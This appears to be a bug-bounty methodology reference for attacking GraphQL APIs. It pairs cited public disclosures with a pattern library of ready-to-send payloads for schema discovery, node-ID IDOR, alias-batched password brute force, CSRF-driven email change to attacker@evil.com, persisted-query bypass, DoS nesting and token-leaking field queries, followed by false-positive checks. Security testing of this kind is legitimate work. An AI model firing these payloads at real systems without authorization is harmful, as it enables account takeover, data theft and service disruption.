# hunt-graphql — Pattern Library

> Patterns and verifiable public examples behind `hunt-graphql`. Operator-grade reference, not a complete enumeration. Cited examples are widely-discussed public cases that any reader can search and verify; uncited patterns are general operator knowledge accumulated from public bounty disclosures, GraphQL framework documentation, and PortSwigger Research.

GraphQL endpoints are top-paying surface in 2025 because the schema is broad (one endpoint exposes the entire data model), the auth layer is often *resolver-side rather than transport-side* (so a single misconfigured resolver leaks cross-tenant data), and the request shape (`{"query": "..."}`) bypasses most parameter-name-based WAF rules. The patterns below are organized by *attack channel* — introspection / schema discovery, authorization (IDOR through node IDs and field-level access), denial-of-service, rate-limit and race amplification via aliases and batching, and operation-confusion via persisted queries — because GraphQL's distinctive paydirt comes from "the resolver checks A but the operator reaches it via B."

## Cited Public Examples

### PortSwigger Research — Daniel Thatcher, GraphQL attack methodology
- **Source:** PortSwigger Research, body of work by Daniel Thatcher and others on GraphQL security. Published at portswigger.net/research; the team also maintains the Web Security Academy GraphQL labs which codify the techniques.
- **Pattern shape:** The methodology Thatcher documented for GraphQL hunting: discover the endpoint, attempt introspection, fall back to field-suggestion fuzzing when introspection is disabled, alias-batch to amplify rate-limited operations, and probe operation-confusion between queries and mutations to exploit auth checks that only run on the wrong operation type.
- **Key trick:** Field-suggestion fuzzing — when introspection returns null/error, send queries with intentionally-misspelled field names and parse the server's "Did you mean...?" error responses. The server unintentionally leaks valid field names while *declining* to enumerate the schema. Tooling: `clairvoyance` automates this against a wordlist.
- **Why it matters:** Most production GraphQL endpoints disable introspection in production builds. Operators who stop at "introspection disabled, moving on" miss everything; operators who carry the field-suggestion + clairvoyance workflow find the schema anyway and proceed to the resolver-auth bugs that pay.

### GitHub Security — GraphQL depth and node-ID design (developer-facing)
- **Source:** GitHub Security Lab and engineering blog posts documenting how GitHub structures GraphQL node IDs (`base64("TypeName:database_id")`) and how they impose query-depth limits to defend against recursive-query DoS. Search the GitHub blog by topic.
- **Pattern shape:** Two adjacent lessons from a well-documented production GraphQL deployment. (1) Node IDs that encode `TypeName:ID` give operators a "global object handle" that they can manipulate to fetch objects of one type using an ID belonging to a different type — IDOR with type confusion. (2) Depth limits without complexity limits are bypassable via fragment-spread amplification — a query that's only 3 levels deep on paper can resolve thousands of nested objects via fragments.
- **Key trick:** Decode every node ID you see (`echo "VXNlcjox" | base64 -d` → `User:1`). Look for `User:`, `Repository:`, `Organization:`, `PullRequest:` prefixes. Then try fetching with a wrong-type ID — `node(id: "User:other-user-id") { ... on User { email role } }` — and observe whether the resolver checks ownership before returning fields.
- **Why it matters:** Node-ID IDOR is the single most-paid GraphQL bug class. The pattern repeats on every Relay-style GraphQL API.

### Apollo Server / Hasura introspection-default disclosures
- **Source:** Apollo Server, Hasura, and most off-the-shelf GraphQL frameworks default to *enabling* introspection unless explicitly turned off for production builds. This is documented in each framework's deployment guide and surfaces in disclosed bounty reports as "introspection enabled in production exposes the full schema."
- **Pattern shape:** Standalone, schema disclosure is informational. *Chained*, it is the prerequisite that turns a hidden authorization bug into a reportable critical: introspection reveals an undocumented mutation (`grantAdminAccess`, `setUserRole`, `bypassPaymentCheck`), the operator discovers it has no authorization guard, the mutation is fired by a low-privilege user, the privilege escalates.
- **Key trick:** Introspection alone is rejected as N/A by most programs. Always pair the introspection finding with a *consequence* — an undocumented mutation reachable from a low-privilege session — and report the consequence.
- **Why it matters:** Don't waste a report on bare introspection. The introspection is recon; the bug is the mutation it surfaced.

### Persisted-query bypass — `extensions.persistedQuery` operation injection
- **Source:** Apollo Server documentation for Automatic Persisted Queries (APQ) and the corresponding security advisories for misconfigurations. The class is documented across Apollo's docs and disclosed reports against APQ-enabled deployments.
- **Pattern shape:** When a GraphQL server enables APQ, the client sends `{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash>"}}}` and the server resolves the hash to a server-stored query string. Misconfigurations include: (a) the server falls back to running the *ad-hoc* `query` field when the hash is unknown (the "PersistedQueryNotFound" fallback), defeating the entire allow-list; (b) the server accepts a falsy hash value and processes the ad-hoc query without comparison; (c) the hash is computed client-side and the server trusts the (hash, query) pair without verifying the hash matches the query content.
- **Key trick:** When a production endpoint claims "persisted queries only" (rejecting ad-hoc queries), test the APQ-fallback by sending a fake hash and a malicious ad-hoc query in the same request. If the server runs the ad-hoc query and returns its result, the allow-list is theatrical.
- **Why it matters:** Operators who give up on a "persisted queries only" endpoint without testing the fallback miss a high-impact misconfig that effectively neutralizes the entire defense.

---

### Field/query-level authz gap → cross-tenant / private-data disclosure
- **Source:** A GraphQL query disclosed sensitive private-program data ($25,000, <https://hackerone.com/reports/1618347>); queries exposed other customers' emails and confidential data (<https://hackerone.com/reports/807448>; <https://hackerone.com/reports/489146>).
- **Pattern shape:** A GraphQL field/type is authorized at the query root but not per-field or per-object, so a caller selects fields (email, private metadata, cross-tenant objects) they shouldn't see. GraphQL's flexible selection makes the missing field-level check easy to reach.
- **Key trick:** Introspect the schema, then request sensitive fields on shared types (`User`, `Program`, `Account`) from an unrelated context. Probe every field, not just what the UI selects — the leak is usually a field the UI never renders.
- **Why it matters:** Direct info-disclosure at scale; the dominant GraphQL bounty class.

### GraphQL IDOR on operation arguments
- **Source:** IDOR on `BillingDocumentDownload` / `BillDetails` operations via the invoice ID (<https://hackerone.com/reports/2207248>, $5,000).
- **Pattern shape:** A GraphQL query/mutation takes an object ID (invoice, document, node) and returns/acts on it without scoping to the viewer — the same IDOR as REST, but reachable through the typed operation and often missed because the REST endpoint *was* fixed.
- **Key trick:** Enumerate operations taking an ID argument; swap IDs across tenants. Always test the Relay `node(id:)`/`nodes()` backdoor. Pairs with `hunt-idor`.
- **Why it matters:** GraphQL re-opens IDORs teams thought they'd closed at the REST layer.

### Mutation aliasing / batching → DoS & rate-limit bypass
- **Source:** DoS via mutation aliasing in an account-recovery flow (<https://hackerone.com/reports/3287208>, $12,500).
- **Pattern shape:** GraphQL lets one request contain many aliased copies of the same mutation/field. Without per-operation cost limits, this amplifies work (DoS) or bypasses per-request rate limits (e.g. brute-forcing OTP/recovery N times in one HTTP request).
- **Key trick:** Send a single query with 100 aliased copies of a sensitive mutation (`a: mutation, b: mutation, ...`). If all execute, there's no query-cost/aliasing limit — report as DoS and/or rate-limit bypass.
- **Why it matters:** A GraphQL-specific amplification with no REST analog; feeds `hunt-brute-force`.

### GraphQL argument → downstream injection (search/sort → engine)
- **Source:** A `sort_query` string argument passed to a downstream Elasticsearch cluster enabled Painless script execution (<https://hackerone.com/reports/3694007>, $7,000).
- **Pattern shape:** A GraphQL string argument (sort, filter, search DSL) flows unsanitized into a downstream engine — Elasticsearch Painless, a SQL builder, a template — turning a query field into an injection/RCE sink.
- **Key trick:** Trace every free-string GraphQL argument to its backend. For search/sort args, test engine-specific injection (Painless `{{...}}`, ES query DSL, SQL). Overlaps `hunt-rce`/`hunt-sqli` at the sink.
- **Why it matters:** Escalates GraphQL from data-layer to code execution.

### Further disclosed reports (this class)

Additional high-signal public disclosures exemplifying the patterns above; read at source for full technique.

- <https://hackerone.com/reports/792927> — $0
- <https://hackerone.com/reports/3000510> — $0
- <https://hackerone.com/reports/1864188> — $3000
- <https://hackerone.com/reports/1122408> — $3370
- <https://hackerone.com/reports/978143> — $2500
- <https://hackerone.com/reports/770209> — $2500
- <https://hackerone.com/reports/2122671> — $0
- <https://hackerone.com/reports/715192> — $2500
- <https://hackerone.com/reports/877642> — $2500
- <https://hackerone.com/reports/981472> — $2000
- <https://hackerone.com/reports/885539> — $0
- <https://hackerone.com/reports/1969141> — $0
- <https://hackerone.com/reports/342978> — $2500
- <https://hackerone.com/reports/343464> — $2500
- <https://hackerone.com/reports/2218334> — $0
- <https://hackerone.com/reports/1711938> — $0
- <https://hackerone.com/reports/871749> — $0
- <https://hackerone.com/reports/707433> — $0
- <https://hackerone.com/reports/435066> — $0
- <https://hackerone.com/reports/898528> — $0

## Pattern Library

### Endpoint discovery — find the GraphQL
- **When to suspect:** Burp passive scan shows POST with `application/json` body of shape `{"query": "..."}`. JS bundles reference Apollo, Relay, `graphql-tag`, `gql\``. Wayback or katana crawl turns up `/graphql`, `/api/graphql`, `/v1/graphql`, `/query`, `/gql`, `/graph`.
- **Test:** GET / POST against the candidate path with the simplest valid query:
  ```
  POST /graphql HTTP/1.1
  Content-Type: application/json

  {"query":"{ __typename }"}
  ```
  Expected response: `{"data":{"__typename":"Query"}}` (or `QueryRoot`, depending on framework).
- **Validation:** The `__typename` introspection field returning *any* non-null value confirms GraphQL. Some frameworks (Hasura) name it `query_root`.
- **Pay-grade rationale:** Discovery only — no bug yet. Used to scope subsequent testing.

### Full introspection query (when enabled)
- **When to suspect:** `{ __typename }` succeeded.
- **Test:** Send the canonical introspection query (Apollo-compatible):
  ```graphql
  {
    __schema {
      types {
        name
        kind
        fields { name type { name kind ofType { name kind } } }
        inputFields { name type { name kind } }
      }
      queryType { name }
      mutationType { name }
      subscriptionType { name }
    }
  }
  ```
- **Validation:** Server returns a populated `types` array with mutation / query field names. Save to a file; grep for keywords (`admin`, `internal`, `bypass`, `grant`, `setRole`, `delete`, `secret`, `token`, `password`).
- **Pay-grade rationale:** Recon. Standalone informational; report only when chained to a downstream bug surfaced from the disclosed schema.

### Field-suggestion fuzzing (introspection disabled)
- **When to suspect:** Introspection returns null, error, or an "Introspection is disabled" message.
- **Test:** Send queries with deliberately-misspelled field names and parse "Did you mean...?" errors:
  ```
  {"query":"{ userrr { id } }"}
  ```
  Response: `{"errors":[{"message":"Cannot query field \"userrr\" on type \"Query\". Did you mean \"user\" or \"users\"?"}]}`
- **Validation:** "Did you mean" responses are present. Tooling — `clairvoyance` (`pip install clairvoyance`) automates this against a wordlist:
  ```bash
  clairvoyance -o schema.json -w wordlist.txt https://target.com/graphql
  ```
- **Pay-grade rationale:** Recon. Same as introspection — informational standalone; load-bearing for downstream findings.

### Node-ID IDOR (Relay-style global object handle)
- **When to suspect:** Schema uses Relay's `Node` interface with `node(id: ID!)` and base64-encoded IDs. Common in GitHub, Shopify, Facebook, and any Relay-based API.
- **Test:** Capture a legitimate node ID from your own session (e.g. `VXNlcjoxMjM=` → `User:123`). Decode, swap to a victim ID or different type, re-encode, and query:
  ```graphql
  {
    node(id: "VXNlcjoxOTk5") {
      ... on User { id email name role permissions }
    }
  }
  ```
  Cross-type — query a `User` ID as if it were a `Repository`:
  ```graphql
  {
    node(id: "VXNlcjoxMjM=") {
      ... on Repository { name owner { login } }
    }
  }
  ```
- **Validation:** Response contains data belonging to a different account / different object type than the requesting session should have access to.
- **Pay-grade rationale:** Critical when cross-tenant data leaks. High when same-tenant cross-object data leaks.

### Alias batching for rate-limit bypass
- **When to suspect:** Endpoint with rate-limiting per HTTP request (login, OTP, redeem code). The rate-limiter counts requests, not operations.
- **Test:** Pack many operations into one query via aliases:
  ```graphql
  mutation {
    a1: login(username: "victim", password: "0000")
    a2: login(username: "victim", password: "0001")
    a3: login(username: "victim", password: "0002")
    a4: login(username: "victim", password: "0003")
    a5: login(username: "victim", password: "0004")
  }
  ```
  One HTTP request = one rate-limit hit, but five password attempts.
- **Validation:** All five resolvers fire (response contains five `a1`..`a5` keys with login results). Rate-limit headers (if present) increment by 1, not 5.
- **Pay-grade rationale:** Critical when chained to brute-force (e.g. 6-digit OTP across 1000 aliases in one request = 1000 attempts at one rate-limit hit).

### Alias batching for race-condition amplification (limited)
- **When to suspect:** A resolver mutates state with a uniqueness or quota check (coupon redeem, balance debit, account-create). Cross-reference `hunt-race`.
- **Test:** Send many aliases of the same mutation in one request:
  ```graphql
  mutation {
    r1: redeemCoupon(code: "WELCOME10")
    r2: redeemCoupon(code: "WELCOME10")
    r3: redeemCoupon(code: "WELCOME10")
    r4: redeemCoupon(code: "WELCOME10")
    r5: redeemCoupon(code: "WELCOME10")
  }
  ```
- **Validation:** Multiple aliases succeed against a uniqueness constraint that should reject after the first. *Important caveat from Phase 2E:* alias batching only races resolvers when the server processes aliases *concurrently* on a multi-threaded resolver. Most reference implementations (Apollo, GraphQL-Ruby, Graphene) resolve aliases *sequentially*. To force concurrency, use parallel HTTP via Burp Turbo Intruder single-packet attack with multiple TCP connections rather than alias batching alone.
- **Pay-grade rationale:** Critical when the race wins (double-spend confirmed).

### Node-IDOR via Base64 ID prediction
- **When to suspect:** Node IDs follow predictable patterns — `base64("User:" + sequential_int)`. Decode three of your own IDs and the encoding scheme reveals itself.
- **Test:** Generate IDs for adjacent integers and query each. Or use `base64("User:1")`, `base64("User:2")`, etc. for low IDs (admin users often live at low integers).
- **Validation:** Sequential enumeration yields cross-account data.
- **Pay-grade rationale:** Critical when admin-tier accounts are reachable.

### GraphQL via GET (CSRF candidate)
- **When to suspect:** Server accepts `GET /graphql?query=...` in addition to POST.
- **Test:**
  ```
  GET /graphql?query={user(id:1){email}} HTTP/1.1
  Cookie: session=victim_session
  ```
  Confirm via browser-clickable link served on attacker.com — if cookies attach and the GraphQL query fires with the victim's session, CSRF is viable.
- **Validation:** Cross-origin request with `Cookie` header attached executes the query.
- **Pay-grade rationale:** Medium standalone (CSRF on a read). High when GET also accepts mutations (rare but seen — usually a misconfiguration). Verify the side effect happened, not just that the request returned 200.

### Mutation-via-GET (server accepts mutation on GET request)
- **When to suspect:** Server treats `mutation` body identically regardless of HTTP method.
- **Test:**
  ```
  GET /graphql?query=mutation{changeEmail(newEmail:"attacker@evil.com")} HTTP/1.1
  Cookie: session=victim_session
  ```
- **Validation:** Email actually changed (verify with a follow-up `GET /api/me` showing the new email). Without verification, the 200 means nothing.
- **Pay-grade rationale:** Critical (CSRF to mutation with side effect).

### Persisted-query fallback bypass (`extensions.persistedQuery`)
- **When to suspect:** Production endpoint rejects ad-hoc queries with "PersistedQueryNotFound" or similar. Apollo Automatic Persisted Queries (APQ) is in play.
- **Test:**
  ```json
  {
    "extensions": {
      "persistedQuery": {
        "version": 1,
        "sha256Hash": "0000000000000000000000000000000000000000000000000000000000000000"
      }
    },
    "query": "{ user(id: 1) { email role } }"
  }
  ```
  If the server returns `PersistedQueryNotFound`, retry the same body without modification — some servers fall back to executing the `query` field. Variations: omit the `sha256Hash`, set it to null, set the entire `extensions` to null.
- **Validation:** The `query` field executes and returns data despite the server's claim of allow-list enforcement.
- **Pay-grade rationale:** Critical. Neutralizes the allow-list defense.

### Depth attack — recursive nesting DoS
- **When to suspect:** Schema has reciprocal references — `User.friends.friends.friends...`, `Post.author.posts.author.posts...`.
- **Test:**
  ```graphql
  {
    user(id: 1) {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends { id name }
              }
            }
          }
        }
      }
    }
  }
  ```
- **Validation:** Server response time grows exponentially, or server returns 500 / connection-reset on sufficient depth. Statistical sampling against baseline (10 requests at depth-3, 10 at depth-8).
- **Pay-grade rationale:** Medium standalone (DoS). High when the server crashes or load increases enough to affect other users — confirm with side-channel timing on a separate endpoint during the attack.

### Alias-amplified DoS
- **When to suspect:** Single expensive resolver (e.g. `expensiveReport`) without per-query cost limiting.
- **Test:** 1000 aliases of the same expensive query in one request — each alias triggers a full resolver invocation.
  ```graphql
  { r1: expensiveReport, r2: expensiveReport, r3: expensiveReport, ... }
  ```
- **Validation:** Response time scales linearly with alias count; server resource utilization spikes.
- **Pay-grade rationale:** Medium to high depending on impact.

### Batch query (top-level array body)
- **When to suspect:** Apollo and some servers accept `[{ "query": "..." }, { "query": "..." }, ...]` as a top-level array body.
- **Test:**
  ```json
  [
    {"query":"{ user(id:1) { email } }"},
    {"query":"{ user(id:2) { email } }"},
    {"query":"{ user(id:3) { email } }"}
  ]
  ```
- **Validation:** Server returns an array of responses, one per batched query. Useful for enumeration with single rate-limit hit.
- **Pay-grade rationale:** Critical when chained to enumeration that the rate-limiter was supposed to prevent.

### Field-level authorization bypass (resolver-side miss)
- **When to suspect:** A type has a `secret`, `password_hash`, `token`, `internal_notes`, `admin_metadata` field. The type-level resolver authorizes "can the user read this object?" but does not authorize each field independently.
- **Test:** Query an object you do have access to, request a normally-hidden field:
  ```graphql
  { me { id email passwordHash recoveryCodes apiToken } }
  ```
- **Validation:** Sensitive field returned in response despite the API's documentation claiming the field is admin-only or internal.
- **Pay-grade rationale:** Critical when password hashes or auth tokens leak.

### Operation-type confusion (query vs mutation)
- **When to suspect:** Server authorizes mutations strictly but treats `query` as anonymous-readable. A side-effecting resolver was registered as a query rather than a mutation.
- **Test:** Look for any field whose name suggests an action (`createUser`, `sendEmail`, `resetPassword`, `transferFunds`) registered under `Query` instead of `Mutation`. Fire it as a query:
  ```graphql
  { resetPassword(email: "victim@target.com") { success } }
  ```
- **Validation:** Side effect happened (email sent, password reset, fund transferred) despite the auth middleware only guarding mutations.
- **Pay-grade rationale:** Critical.

---

## Anti-Patterns (FP traps)

### Introspection returning null claimed as "introspection enabled"
- **Looks like:** You send the full introspection query, response is `{"data":{"__schema":null}}`. Introspection appears partially-disabled.
- **Actually is:** Many servers return `null` for the entire `__schema` field when introspection is policy-disabled, *not* an error. The response shape "looks like" introspection succeeded but returned no data. Operators reading `data` as "introspection worked" file an N/A.
- **How to disprove:** Introspection enabled returns a populated `types` array. `null` data is *disabled*. Fall through to field-suggestion fuzzing (`{ userrr { id } }`) and clairvoyance to enumerate the schema by other means.

### `errors: null` in response claimed as "data leaked successfully"
- **Looks like:** Response is `{"data": {"user": {"email": "victim@target.com"}}, "errors": null}`. Operator concludes the query succeeded.
- **Actually is:** Some GraphQL servers strip the `data` field on partial errors and return `{"data": null, "errors": [...]}`. Other servers return partial data with `errors` populated. The combination `data` populated and `errors: null` *can* be a misconfiguration where the server returned data it should not have — but it can also be a legitimate query the operator already had permission to make. Body-Diff Rule: compare the response from your session to the response from an unauthenticated session and to a victim-session-token-equivalent request. If only your authorized session sees the data, no IDOR happened.
- **How to disprove:** Use *two* sessions — attacker (you) and victim (a second account you control). If attacker session queries victim's data and returns it, that's the IDOR. If both sessions return their own data and neither reaches the other, the API is correctly scoped.

### GraphQL CSRF via GET that returns 200 but no side effect
- **Looks like:** You send a mutation via GET, server returns 200 with a body. Reported as CSRF-to-mutation.
- **Actually is:** Many servers happily parse a `mutation` from a `query=` parameter at the HTTP layer but reject it at the resolver level because mutations are HTTP-method-restricted to POST. The 200 is the GraphQL "parsed your query and rejected the operation" response with `errors` populated. The mutation did not execute.
- **How to disprove:** Verify the *side effect*. If the mutation was `changeEmail`, fetch `/api/me` after the test and confirm the email changed. If the mutation was `transferFunds`, check the balance. A 200 response without side-effect confirmation is not a successful mutation.

### Alias batching that "works" but operations are sequential
- **Looks like:** You send 100 aliases of `redeemCoupon` in one request, all 100 return `success: true`. Reported as race condition double-spend.
- **Actually is:** Most GraphQL implementations resolve aliases sequentially within a single request, holding the request open until all 100 complete. The first alias's mutation commits, the second alias's mutation hits the uniqueness constraint, and either fails or succeeds depending on whether the constraint is enforced per-transaction or per-row. If the response shows 100 successes, either there's no constraint (and the bug is "no quota enforcement," not "race condition") or the constraint is row-level and the database happily inserted 100 rows.
- **How to disprove:** Check the *server state* after the test — does the user actually have 100 coupons applied to their balance? If yes, it's a quota bug regardless of "race." If only one coupon applied and 99 of the "success" responses were ignored downstream, the race didn't win. For a true GraphQL race, use parallel HTTP (Burp Turbo Intruder single-packet) with separate TCP connections — see `hunt-race`.

### Schema disclosure claimed as critical without consequence
- **Looks like:** Introspection enabled in production reveals the full schema. Reported as critical because "an attacker has the entire API map."
- **Actually is:** Schema disclosure on its own is informational. The HackerOne / Bugcrowd triage default for "introspection enabled" is Low or N/A unless paired with a downstream finding (undocumented mutation reachable, sensitive field disclosed, etc.).
- **How to disprove:** Don't disprove — *escalate*. Before reporting, query the schema for terms (`admin`, `internal`, `bypass`, `secret`, `grant`, `set`, `delete`, `password`, `token`), find a candidate field, and confirm it is reachable from your session with privileges it should not have. The introspection then becomes a recon step inside the chain to the real bug.
